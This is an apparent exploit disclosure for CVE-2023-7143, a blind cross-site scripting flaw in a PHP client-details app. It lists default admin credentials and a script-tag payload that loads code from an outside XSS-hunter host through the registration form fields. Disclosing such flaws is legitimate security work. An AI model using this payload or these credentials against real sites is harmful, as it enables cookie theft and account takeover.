# CVE-2023-7143_Client_Details_System-Blind_Cross_Site_Scripting
+ **Exploit Title:** CVE-2023-7143_Client_Details_System-Blind_Cross_Site_Scripting
+ **Date:** 2023-26-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/client-details-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/CLIENT_DETAILS_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-2023-7143

## References: 
+ **CVE-2023-7143:** https://vuldb.com/?id.249146
+ https://www.cve.org/CVERecord?id=CVE-2023-7143
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-7143
+ https://nvd.nist.gov/vuln/detail/CVE-2023-7143

## Description:
Client_Details_System 1.0 allows Blind Cross-Site Scripting via parameters 'fname', 'lname', 'email' and 'contact' in "/clientdetails/admin/regester.php". Client_Details_System is vulnerable to a blind cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Proof of Concept:
+ Go to the Admin Panel: "http://localhost/clientdetails/admin/"
+ Login with `admin`:`client123`
+ Go to Create Users: "http://localhost/clientdetails/admin/regester.php"
+ Then go to the xsshunter app on https://xsshunter.trufflesecurity.com and login.
+ XSS PAYLOADS -> Copy Payload "Basic <script> Tag Payload"
+ Fill the form parameters 'fname', 'lname', 'email' and 'contact' with the payload `"><script src="https://js.rip/b23tmbxf49"></script>`
+ Save and then go to XSS PAYLOAD FIRES on the xsshunter.
+ Check Reports.

![7-1](https://github.com/h4md153v63n/CVEs/assets/5091265/51ded0aa-4808-4b61-896e-e8e99a315a73)
<br>
<br>
![7-2](https://github.com/h4md153v63n/CVEs/assets/5091265/51f60b4d-0fe7-478c-884c-f16060b25fea)
<br>
<br>
![7-3](https://github.com/h4md153v63n/CVEs/assets/5091265/f195eb57-e2c2-4d70-b81f-ba46819c6ab4)
<br>
<br>
![7-4](https://github.com/h4md153v63n/CVEs/assets/5091265/588bd279-e6dd-4350-a2ce-5bb4f8097be4)
<br>
<br>
![7-5](https://github.com/h4md153v63n/CVEs/assets/5091265/1460887d-799b-4999-8f0f-3433393fe77b)
<br>
<br>
![7-6](https://github.com/h4md153v63n/CVEs/assets/5091265/ff4effde-880b-49bc-8aba-b8cc3885b0f6)
